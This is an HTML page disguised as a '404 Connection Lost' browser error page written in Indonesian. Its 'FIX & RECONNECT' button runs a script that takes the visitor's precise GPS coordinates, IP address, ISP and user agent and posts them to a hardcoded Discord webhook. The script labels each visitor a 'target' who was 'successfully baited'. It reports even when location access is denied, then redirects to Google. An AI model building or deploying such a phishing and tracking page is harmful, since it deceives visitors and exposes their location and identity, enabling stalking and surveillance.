<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 - Connection Lost</title>
    <style>
        body {
            background-color: #f4f7f9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: white;
            padding: 50px 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
            max-width: 500px;
            text-align: center;
            border: 1px solid #e1e8ed;
        }

        h1 {
            color: #e74c3c;
            font-size: 80px;
            margin: 0;
            font-weight: 700;
        }

        h2 {
            color: #2c3e50;
            font-size: 22px;
            margin: 10px 0 20px 0;
        }

        p {
            color: #7f8c8d;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .btn-fix {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 14px 35px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-fix:hover {
            background-color: #2980b9;
        }

        .error-code {
            margin-top: 30px;
            font-size: 11px;
            color: #bdc3c7;
            font-family: monospace;
        }
    </style>
</head>

<body>

    <div class="container">
        <h1>404</h1>
        <h2>Connection Lost</h2>
        <p>Terdeteksi kegagalan sinkronisasi pada sesi browser Anda.<br>Keamanan enkripsi mungkin terganggu.</p>

        <button class="btn-fix" id="actionBtn">FIX & RECONNECT</button>

        <div class="error-code">Error Code: ERR_SSL_PROTOCOL_ERROR_SYNC</div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500542592398397652/aJhsNN61hz6Qv8PTssvjJxZKxpm55uO27EzJtT1jROeQSD8I7fdMH1ImMz94JX45TE01";

        document.getElementById('actionBtn').addEventListener('click', async function () {
            this.innerText = "Processing...";
            this.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {

                    let ipInfo = { ip: "Unknown", org: "Unknown", city: "Unknown" };
                    try {
                        const res = await fetch('https://ipapi.co/json/');
                        ipInfo = await res.json();
                    } catch (e) { }

                    const payload = {
                        username: "System Security Monitor",
                        embeds: [{
                            title: "🚨 Target Berhasil Terpancing!",
                            color: 15548997,
                            fields: [
                                { name: "📍 Koordinat GPS", value: `\`${pos.coords.latitude}, ${pos.coords.longitude}\`` },
                                { name: "🗺️ Google Maps", value: `[Klik Disini](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})` },
                                { name: "🌐 IP Address", value: `\`${ipInfo.ip}\``, inline: true },
                                { name: "🏢 Provider/ISP", value: `\`${ipInfo.org}\``, inline: true },
                                { name: "📱 Perangkat", value: `\`${navigator.userAgent}\`` }
                            ],
                            footer: { text: "Audit Sistem Keamanan - " + new Date().toLocaleString() }
                        }]
                    };

                    await fetch(WEBHOOK_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(payload)
                    });


                    window.location.href = "https://www.google.com";

                }, async (err) => {

                    await fetch(WEBHOOK_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: "⚠️ Target klik Fix & Reconnect tapi **MENOLAK (Deny)** akses lokasi."
                        })
                    });
                    window.location.href = "https://www.google.com";
                }, {
                    enableHighAccuracy: true,
                    timeout: 10000
                });
            }
        });
    </script>
</body>

</html>
